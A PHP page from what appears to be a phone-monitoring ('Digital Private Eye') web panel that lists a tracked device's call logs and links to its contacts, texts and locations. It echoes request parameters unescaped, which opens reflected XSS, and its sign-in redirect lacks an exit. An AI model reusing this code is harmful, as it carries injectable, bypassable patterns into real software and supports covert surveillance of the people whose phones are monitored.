<?php
session_start();
CONST APPLICATION_INITIALS = 'DPEye';
CONST APPLICATION_WEBSITE = 'http://digitalprivateeye.com';
CONST APPLICATION_NAME = 'Digital Private Eye';
CONST APPLICATION_DOWNLOAD_URL = 'https://play.google.com/store/apps/details?id=com.ghostservice';
CONST OWNER = 'Made Software Ltd';
CONST FACEBOOK_URL = 'https://www.facebook.com/pages/Digital-Private-Eye/703312569701920';
CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";

if(!$_SESSION['user_id']) 
    header("Location: sign-in.php");

$currentPage = $page = 1;      

if(array_key_exists("page", $_GET)) 
    $currentPage = $page = $_GET['page'];

include("logic/Devices.php");

$devicesModel = new Devices();
$deviceId = $_GET['device'];
$callLogs = $devicesModel->getDeviceCallLogs($_GET['device'], $page);

$deviceInfo =  $devicesModel->getDeviceInfo($deviceId);
$deviceDescription = $deviceInfo['description'];

//Pagination
$noRecords = $devicesModel->getDeviceCallLogsTotalNoRecords($deviceId);
$noOfPages = ceil($noRecords/15);
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Device Call Logs - <?=APPLICATION_NAME;?>- <?=$deviceDescription?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Le styles -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
    <!--[if IE 7]>
      <link rel="stylesheet" href="css/font-awesome-ie7.min.css">
    <![endif]-->
    <link rel="stylesheet" type="text/css" href="css/style.css" />

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Fav &amp; touch icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/sample/logo-144.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/sample/logo-114.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/sample/logo-72.png">
                    <link rel="apple-touch-icon-precomposed" href="img/sample/logo-57.png">
                                   <link rel="shortcut icon" href="img/sample/logo.png">
    
  </head>

  <body>


  <?php
  include "nav.php";
  ?>
    
    <div class="clear"></div>
    
    <div class="container-wrapper container-top">
      <div class="container container-top">
        <div class="row">
          <div class="col-md-12 center">
            <h1>Call Logs Of <?=$deviceDescription?></h1>
          </div>
        </div><!-- end row -->
      </div><!-- end container -->
    </div><!-- end container wrapper -->

  <?php $deviceId = $_GET['device'];?>
    <div class="container">
      <div class="row">
        <div class="col-md-3 bs-docs-nav-wrapper">
          <ul class="nav nav-pills nav-stacked bs-docs-nav" data-spy="affix" data-offset-top="250" data-offset-bottom="350">
              <li><a  class="list-group-item"href="javascript: location.reload();" onclick='showLoadingDiv()'>Refresh Results&nbsp&nbsp<img src="img/refresh.png" style="width: 30px;"> </a></li>
              <?php
              echo "<li><a  class=\"list-group-item\"target=\"_blank\" href=\"device-call-logs-pdf.php?device=$deviceId\">Download Pdf&nbsp&nbsp<img src=\"img/download-button.png\" style=\"width: 30px;\"> </a></li>";
              ?>
          </ul>

            <ul class="nav nav-pills nav-stacked bs-docs-nav" data-spy="affix" data-offset-top="250" data-offset-bottom="350">
                <li><a  class="list-group-item" href="devices.php" onclick='showLoadingDiv()'>Devices</a></li>
                <li><a  class="list-group-item" href="device-contacts.php?device=<?=$deviceId?>" onclick='showLoadingDiv()'>Contacts</a></li>
                <li><a  class="list-group-item" href="device-call-logs.php?device=<?=$deviceId?>" onclick='showLoadingDiv()'>Call Logs</a></li>
                <li><a  class="list-group-item" href="device-texts.php?device=<?=$deviceId?>" onclick='showLoadingDiv()'>Text Messages</a></li>
                <li><a  class="list-group-item" href="device-locations.php?device=<?=$deviceId?>" onclick='showLoadingDiv()'>Locations</a></li>
            </ul>
        </div>
        <div class="col-md-8 col-md-offset-1">


            <div class="table-responsive">
                <table class="table table-striped table-condensed" >
                    <tr>
                        <td style='padding-right:20px;'><strong>Date</strong></td>
                        <td style='padding-right:20px;'><strong>Name/Number</strong></td>
                        <td style='padding-right:20px;'><strong>Call Type</strong></td>
                        <td style='padding-right:20px;'><strong>Duration</strong></td>
                    </tr>
                    <?php
                    if(!$callLogs) echo "<tr><td> No data to display</td></tr>";
                    else
                    {
                        foreach($callLogs as $callLog)
                        {
                            $number = 0;
                            if(array_key_exists('telephone_number', $callLog))
                                $number = $callLog['telephone_number'];
                            $date = 0;
                            if(array_key_exists('date', $callLog))
                                $date = $callLog['date'];

                            $callType = "";
                            if(array_key_exists('call_type', $callLog)){
                                $callType = $callLog['call_type'];
                                if($callType=='1') $callType = "Incoming Call";
                                else if($callType=='2') $callType = "Outgoing Call";
                                else if($callType=='3') $callType = "Missed Call";
                                else $callType = "Unresolved";
                            }

                            $duration = 0;
                            if(array_key_exists('duration', $callLog))
                                $duration = $callLog['duration'];
                            $cachedName = "";
                            if(array_key_exists('cached_name', $callLog)){
                                $cachedName = $callLog['cached_name'];
                                if($cachedName=="null") 
                                    $cachedName = null;
                            }
                            
                            echo "<tr>
                                        <td style='padding-right:20px;'>
                                            <script>
                                                var localTime = new Date($date);
                                                document.write(localTime.toString().substring(0,25));
                                            </script>
                                        </td>
                                        <td style='padding-right:20px;'>".($cachedName ? $cachedName." (".$number.")" :$number)."</td>
                                        <td style='padding-right:20px;'>$callType</td>
                                        <td style='padding-right:20px;'>$duration secs</td>
                                      </tr>";
                        }
                    }
                    ?>
                </table>
            </div>

              <div class="col-md-12">
                  <div class="pagination-wrapper">
                      <ul class="pagination">
                          <?php
                          $previousPage = $currentPage-1;
                          $nextPage = $currentPage+1;
                          $deviceId = $_GET['device'];
                              if($noOfPages >1)
                              {
                                  if($currentPage > 1) echo "<li ><a href='?device=$deviceId&page=$previousPage' onclick='showLoadingDiv()' >«</a></li>";
                                    else echo "<li class=\"disabled\"><a href=\"#none\" onclick='showLoadingDiv()'>«</a></li>";
                                  for($i=1;$i<=$noOfPages;$i++)
                                  {
                                      if($currentPage==$i) $active = "class=\"active\"";
                                      else $active = "";
                                      echo "<li ".$active."><a href=\"?device=$deviceId&page=$i\" onclick='showLoadingDiv()'>". $i . "</a></li>";
                                  }
                                  if($currentPage < $noOfPages) echo "<li><a href='?device=$deviceId&page=$nextPage' onclick='showLoadingDiv()' >»</a></li>";
                              }
                          ?>
                      </ul>
                  </div>
                  <?php
                    if($noOfPages >1)
                    {
                      echo " <ul class=\"pager\">";
                      if ($currentPage!=1) echo "<li><a href='?device=$deviceId&page=$previousPage' onclick='showLoadingDiv()'>Previous Page</a></li>";
                        else echo "<li></li>";
                      if ($currentPage!=(strval($noOfPages))) echo "<li><a href='?device=$deviceId&page=$nextPage' onclick='showLoadingDiv()'>Next Page</a></li>";
                        else echo "<li></li>";
                      echo "</ul>";
                    }
                  ?>
              </div><!-- end col -->
          </div><!-- end row -->
      </div><!-- end row -->
    </div><!-- end container -->

    <div class="clear"></div>


    <?php
    include "footer.php";
    ?>

    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/zion.js"></script>
    <script type="text/javascript">
      
        $(document).ready(function(){
          $("body").scrollspy({target: ".bs-docs-nav-wrapper", offset:50});
        });
      
    </script>

  </body>
</html>
